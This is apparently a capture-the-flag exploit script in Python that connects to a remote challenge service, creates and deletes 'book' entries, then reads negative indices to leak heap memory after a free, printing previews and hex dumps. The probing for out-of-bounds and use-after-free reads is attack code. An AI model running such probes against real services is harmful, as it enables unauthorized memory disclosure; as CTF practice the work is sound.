import socket
import time
import binascii

HOST = "host5.metaproblems.com"
PORT = 5020


def recv_all(s, timeout=1.0):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(chunk) < 4096:
                break
    except socket.timeout:
        pass
    return data


s = socket.create_connection((HOST, PORT), timeout=10)
print("[*] connected")
print(recv_all(s, 1).decode(errors="ignore"))

# create book 0
s.sendall(b"1\n")
time.sleep(0.1)
_ = recv_all(s, 0.5)
s.sendall(b"A\n")
time.sleep(0.1)
_ = recv_all(s, 0.5)
s.sendall(b"1\n")
time.sleep(0.1)
_ = recv_all(s, 0.5)

# create book 1
s.sendall(b"1\n")
time.sleep(0.1)
_ = recv_all(s, 0.5)
s.sendall(b"B\n")
time.sleep(0.1)
_ = recv_all(s, 0.5)
s.sendall(b"1\n")
time.sleep(0.1)
_ = recv_all(s, 0.5)

# delete book 0
s.sendall(b"4\n")
time.sleep(0.05)
_ = recv_all(s, 0.2)
s.sendall(b"0\n")
time.sleep(0.2)
print("[*] deleted book 0, server says:")
print(recv_all(s, 0.5).decode(errors="ignore"))

print("[*] scanning negative indices -1..-16 after free")
for i in range(-1, -17, -1):
    # read
    s.sendall(b"3\n")
    time.sleep(0.05)
    _ = recv_all(s, 0.2)
    s.sendall(str(i).encode() + b"\n")
    time.sleep(0.25)
    data = recv_all(s, 0.6)
    if not data:
        print(f"[{i}] no response")
        continue
    if b"Invalid book" in data:
        print(f"[{i}] Invalid book")
        continue
    print(f"[{i}] {len(data)} bytes")
    print("PREVIEW:", data.decode(errors="ignore")[:300])
    print("HEX:", binascii.hexlify(data)[:256].decode())

s.close()
print("[+] done")
